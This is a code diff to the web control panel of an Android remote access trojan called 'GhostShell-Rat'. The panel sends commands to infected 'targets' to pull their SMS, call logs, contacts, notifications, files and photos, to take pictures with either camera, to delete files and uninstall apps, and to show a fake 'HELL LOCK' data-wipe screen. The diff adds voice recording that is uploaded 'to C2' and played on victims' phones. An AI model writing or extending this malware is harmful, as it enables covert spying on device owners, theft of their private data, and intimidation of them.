@@ -38,12 +38,10 @@
             <h1 style="font-size:1.5rem; color:var(--primary);"><i class="fas fa-skull"></i> GhostShell-Rat</h1>
             <div style="color:var(--secondary); font-size:1.2rem;"><i class="fas fa-ghost"></i> ONLINE</div>
         </header>
-
         <div class="panel">
             <h3 style="color:var(--secondary); margin-bottom:10px;"><i class="fas fa-satellite"></i> TARGETS</h3>
             <div id="device-list">Scanning...</div>
         </div>
-
         <div class="panel">
             <div class="status-bar">
                 <span>🎯 Target: <b id="sel-info" style="color:var(--primary)">None</b></span>
@@ -65,7 +63,7 @@
     </div>
 
     <script>
-        let state = { devices: [] }, selId = null, curMod = null, cache = {}, hash = "", flash = false;
+        let state = { devices: [] }, selId = null, curMod = null, cache = {}, hash = "", flash = false, mediaRecorder, audioChunks = [];
 
         async function cmd(c, b={}) {
             if(!selId) return;
@@ -89,13 +87,16 @@
                 f.innerHTML = `<button onclick="cmd('vibrate '+document.getElementById('vsec').value)">START VIBRATE</button>`;
                 return;
             } else if(t === 'panic') {
-                b.innerHTML = `
-                    <p style="margin-bottom:5px;">Duration (Seconds):</p>
-                    <input type="number" id="psec" value="30" style="margin-bottom:15px;">
-                    <p style="margin-bottom:5px;">Scary Message (Multiline supported):</p>
-                    <textarea id="pmsg" style="height:150px;">SYSTEM CRITICAL ERROR!\nUNAUTHORIZED ACCESS DETECTED\nYOUR DATA IS BEING WIPED...</textarea>
-                `;
-                f.innerHTML = `<button class="red-btn" style="width:100%" onclick="startPanic()">🔥 ACTIVATE HELL LOCK</button><button onclick="cmd('stop_panic')">STOP</button>`;
+                b.innerHTML = `<p>Duration (Seconds):</p><input type="number" id="psec" value="30"><p style="margin-top:10px;">Scary Message:</p><textarea id="pmsg" style="height:100px;">SYSTEM FAILURE!</textarea>`;
+                f.innerHTML = `<button class="red-btn" style="width:100%" onclick="const msg=document.getElementById('pmsg').value.replace(/\\n/g,'<br>'); cmd('panic '+document.getElementById('psec').value+'|'+msg)">🔥 ACTIVATE HELL LOCK</button><button onclick="cmd('stop_panic')">STOP</button>`;
+                return;
+            } else if(t === 'setwallpaper') {
+                b.innerHTML = `<p>Upload Image:</p><input type="file" onchange="uploadWall(this)"><p style="margin-top:15px;">Or Direct URL:</p><input id="wurl" placeholder="https://domain.com/img.jpg">`;
+                f.innerHTML = `<button onclick="cmd('set_wallpaper '+document.getElementById('wurl').value)">APPLY URL</button>`;
+                return;
+            } else if(t === 'voice') {
+                b.innerHTML = `<div style="text-align:center; padding:20px;"><i id="v-icon" class="fas fa-microphone" style="font-size:3rem; color:var(--dim)"></i><p id="v-stat" style="margin-top:15px;">Ready to record...</p></div>`;
+                f.innerHTML = `<button id="v-start" onclick="startRec()">START RECORDING</button><button id="v-stop" onclick="stopRec()" style="display:none" class="red-btn">STOP & SEND</button>`;
                 return;
             }
 
@@ -104,10 +105,37 @@
             render();
         }
 
-        function startPanic() {
-            const sec = document.getElementById('psec').value;
-            const msg = document.getElementById('pmsg').value.replace(/\n/g, '<br>');
-            cmd('panic ' + sec + '|' + msg);
+        async function startRec() {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            mediaRecorder = new MediaRecorder(stream);
+            audioChunks = [];
+            mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+            mediaRecorder.onstop = sendAudio;
+            mediaRecorder.start();
+            document.getElementById('v-icon').style.color = 'red';
+            document.getElementById('v-stat').innerText = 'Recording...';
+            document.getElementById('v-start').style.display = 'none';
+            document.getElementById('v-stop').style.display = 'inline-block';
+        }
+        function stopRec() { mediaRecorder.stop(); }
+        async function sendAudio() {
+            document.getElementById('v-stat').innerText = 'Uploading to C2...';
+            const audioBlob = new Blob(audioChunks, { type: 'audio/mpeg' });
+            const formData = new FormData();
+            formData.append('file', audioBlob);
+            const res = await fetch('/api/upload_voice', { method: 'POST', body: formData });
+            const data = await res.json();
+            if(data.status === 'ok') {
+                cmd('play_voice ' + window.location.origin + '/captured_images/' + data.filename);
+                document.getElementById('v-stat').innerText = 'Sent! Target is hearing you.';
+            }
+        }
+
+        async function uploadWall(input) {
+            const formData = new FormData(); formData.append('file', input.files[0]);
+            const res = await fetch('/api/upload_wallpaper', {method:'POST', body:formData});
+            const data = await res.json();
+            if(data.status === 'ok') cmd('set_wallpaper ' + window.location.origin + '/captured_images/' + data.filename);
         }
 
         function closeModal() {
@@ -118,53 +146,35 @@
 
         function render() {
             if(!curMod || !selId || !cache[selId]) return;
-            if(['panic', 'vibrate', 'open_url'].includes(curMod)) return;
-
+            if(['panic', 'vibrate', 'open_url', 'setwallpaper', 'voice'].includes(curMod)) return;
             const d = cache[selId], b = document.getElementById('modal-body'), f = document.getElementById('modal-footer');
-            const curHash = JSON.stringify(d[curMod] || d.media || d.location || d.info || "");
-            
-            if(curMod !== 'contacts' && hash === curHash) return; 
-            hash = curHash;
+            const curHash = JSON.stringify(d[curMod] || d.info || "");
+            if(hash === curHash) return; hash = curHash;
             b.innerHTML = ""; f.innerHTML = "";
 
-            if(curMod === 'info') {
-                const i = d.info;
-                b.innerHTML = `<div style="display:grid; grid-template-columns:1fr 1fr; gap:15px;">
-                    <div class="panel" style="background:#0a1212;">
-                        <small style="color:var(--primary)">MODEL</small><h2>${i.Model || '?'}</h2>
-                    </div>
-                    <div class="panel" style="background:#0a1212;">
-                        <small style="color:var(--secondary)">BATTERY</small><h2>${i.Battery || '?'}</h2>
-                    </div>
-                    <div class="panel" style="background:#0a1212; grid-column:1/-1;">
-                        <table style="font-size:0.8rem">
-                            <tr><td>WiFi</td><td>${i.WiFi || 'N/A'}</td></tr>
-                            <tr><td>SIM 1</td><td>${i['SIM 1'] || 'N/A'}</td></tr>
-                            <tr><td>Number</td><td>${i.PhoneNumber || 'N/A'}</td></tr>
-                        </table>
-                    </div>
-                </div>`;
+            if(curMod === 'sms') {
+                b.innerHTML = `<table><tr><th>Sender</th><th>Text</th></tr>${d.sms.map(l=>`<tr><td>${l.userSender}</td><td>${l.content}</td></tr>`).join('')}</table>`;
+            } else if(curMod === 'calls') {
+                b.innerHTML = `<table><tr><th>Number</th><th>Dur</th></tr>${d.calls.map(l=>`<tr><td>${l.number}</td><td>${l.duration_seconds}s</td></tr>`).join('')}</table>`;
+            } else if(curMod === 'apps') {
+                b.innerHTML = `<table><tr><th>App</th><th>PKG</th></tr>${d.apps.map(a=>`<tr><td>${a.appName}</td><td><button onclick="cmd('run ${a.packageName}')">Run</button> <button class="red-btn" onclick="cmd('uninstall ${a.packageName}')">X</button></td></tr>`).join('')}</table>`;
             } else if(curMod === 'contacts') {
-                const contacts = d.contacts || [];
-                b.innerHTML = `<table><tr><th>Name</th><th>Number</th></tr>${contacts.map(c=>`<tr><td>${c.name}</td><td>${c.number}</td></tr>`).join('')}</table>`;
+                b.innerHTML = `<table><tr><th>Name</th><th>Number</th></tr>${d.contacts.map(c=>`<tr><td>${c.name}</td><td>${c.number}</td></tr>`).join('')}</table>`;
             } else if(curMod === 'filemanager') {
                 const fm = d.fm;
                 b.innerHTML = `<div style="background:#0a1212; padding:8px; border-radius:10px; font-family:monospace; font-size:0.75rem; color:var(--primary); margin-bottom:10px;">📂 ${fm.path}</div>
                                <table>${fm.files.map(x=>`<tr><td>${x.isDirectory?'📁':'📄'}</td><td onclick="cmd('${x.isDirectory?'cd':'get'} ${x.name}'); if('${x.isDirectory}'=='true') cmd('ls');" style="cursor:pointer;">${x.name}</td><td style="text-align:right"><button onclick="cmd('del ${x.name}'); cmd('ls');">DEL</button></td></tr>`).join('')}</table>`;
-            } else if(curMod === 'gallery') {
-                const g = d.gallery;
-                b.innerHTML = `<div class="gal-grid">${g.files.map(x=>`<div class="gal-item"><img src="data:image/jpeg;base64,${x.thumbnail}"/><p style="font-size:0.5rem">${x.name}</p></div>`).join('')}</div>`;
-                f.innerHTML = `<button onclick="cmd('gallery back')">PREV</button><span>PAGE ${g.page}</span><button onclick="cmd('gallery next')">NEXT</button>`;
-            } else if(curMod === 'takebackpic' || curMod === 'takefrontpic') {
+            } else if(curMod === 'info') {
+                const i = d.info;
+                b.innerHTML = `<table><tr><td>Model</td><td>${i.Model}</td></tr><tr><td>Battery</td><td>${i.Battery}</td></tr><tr><td>WiFi</td><td>${i.WiFi}</td></tr><tr><td>SIM 1</td><td>${i['SIM 1']}</td></tr><tr><td>Number</td><td>${i.PhoneNumber}</td></tr></table>`;
+            } else if(curMod.includes('pic')) {
                 const m = d.media;
-                if(m.last_img) {
-                    b.innerHTML = `<div style="text-align:center;"><img src="${m.is_direct?'data:image/jpeg;base64,'+m.last_img:'/captured_images/'+m.last_img}" style="width:100%; border-radius:15px; border:1px solid var(--primary);"></div>`;
-                } else b.innerHTML = `<p style="text-align:center">${m.status || 'Capturing...'}</p>`;
-            } else if(curMod === 'toast') {
-                b.innerHTML = `<p>Message:</p><textarea id="lmsg" style="width:100%; height:100px; background:#1a2525; color:#fff; border-radius:10px; padding:10px;">SYSTEM LOCKED</textarea><p style="margin-top:10px;">PIN:</p><input id="lpin" value="1337">`;
-                f.innerHTML = `<button class="red-btn" onclick="cmd('lock '+document.getElementById('lmsg').value.replace(/\\n/g, '<br>')+'|'+document.getElementById('lpin').value)">LOCK</button><button onclick="cmd('unlock')">UNLOCK</button>`;
+                b.innerHTML = `<div style="text-align:center;"><img src="${m.is_direct?'data:image/jpeg;base64,'+m.last_img:'/captured_images/'+m.last_img}" style="width:100%; border-radius:15px;"></div>`;
             } else if(curMod === 'notifications') {
                 b.innerHTML = `<table><tr><th>App</th><th>Message</th></tr>${d.notifications.map(n=>`<tr><td>${n.packageName}</td><td>${n.title}: ${n.text}</td></tr>`).join('')}</table>`;
+            } else if(curMod === 'toast') {
+                b.innerHTML = `<p>Msg:</p><textarea id="lmsg">LOCKED</textarea><p>PIN:</p><input id="lpin" value="1337">`;
+                f.innerHTML = `<button onclick="cmd('lock '+document.getElementById('lmsg').value+'|'+document.getElementById('lpin').value)">LOCK</button><button onclick="cmd('unlock')">UNLOCK</button>`;
             }
         }
 
@@ -187,23 +197,18 @@
             document.getElementById('sel-info').innerText = selId || "None";
             document.getElementById('conn-stat').innerText = e ? "ONLINE":"OFFLINE";
             document.getElementById('conn-stat').style.color = e ? "#00ffc3":"#ff3b9e";
-            
             const btns = [
-                {id:'panic', i:'fa-triangle-exclamation', l:'HELL LOCK'}, {id:'vibrate', i:'fa-mobile-vibration', l:'VIBRATE'},
-                {id:'info', i:'fa-circle-info', l:'INFO'}, {id:'contacts', i:'fa-address-book', l:'CONTACTS'},
-                {id:'sms', i:'fa-sms', l:'SMS'}, {id:'calls', i:'fa-phone', l:'CALLS'},
-                {id:'filemanager', i:'fa-folder', l:'FILES'}, {id:'gallery', i:'fa-images', l:'GALLERY'},
-                {id:'notifications', i:'fa-bell', l:'NOTIFS'}, {id:'apps', i:'fa-th', l:'APPS'},
-                {id:'get_location', i:'fa-map-marker-alt', l:'GPS'}, {id:'flash', i:'fa-bolt', l:'FLASH'},
+                {id:'panic', i:'fa-triangle-exclamation', l:'HELL LOCK'}, {id:'voice', i:'fa-microphone', l:'SEND VOICE'},
+                {id:'vibrate', i:'fa-mobile-vibration', l:'VIBRATE'}, {id:'info', i:'fa-circle-info', l:'INFO'},
+                {id:'contacts', i:'fa-address-book', l:'CONTACTS'}, {id:'sms', i:'fa-sms', l:'SMS'},
+                {id:'calls', i:'fa-phone', l:'CALLS'}, {id:'filemanager', i:'fa-folder', l:'FILES'},
+                {id:'gallery', i:'fa-images', l:'GALLERY'}, {id:'notifications', i:'fa-bell', l:'NOTIFS'},
+                {id:'apps', i:'fa-th', l:'APPS'}, {id:'flash', i:'fa-bolt', l:'FLASH'},
                 {id:'takebackpic', i:'fa-camera', l:'CAM BACK'}, {id:'takefrontpic', i:'fa-video', l:'CAM FRONT'},
                 {id:'setwallpaper', i:'fa-image', l:'WALLPAPER'}, {id:'toast', i:'fa-lock', l:'SYSTEM LOCK'},
                 {id:'open_url', i:'fa-globe', l:'OPEN URL'}
             ];
             document.getElementById('main-grid').innerHTML = btns.map(b=>`<div class="btn" onclick="${b.id==='flash'?'flash=!flash; cmd(flash?\'flashon\':\'flashoff\')':'openModal(\''+b.id+'\')'}"><i class="fas ${b.i}"></i>${b.l}</div>`).join('');
-        }
-        function filterT(e) {
-            let v = e.value.toLowerCase(), rows = e.nextElementSibling.rows;
-            for(let i=1; i<rows.length; i++) rows[i].style.display = rows[i].innerText.toLowerCase().includes(v) ? '' : 'none';
         }
         poll();
     </script>
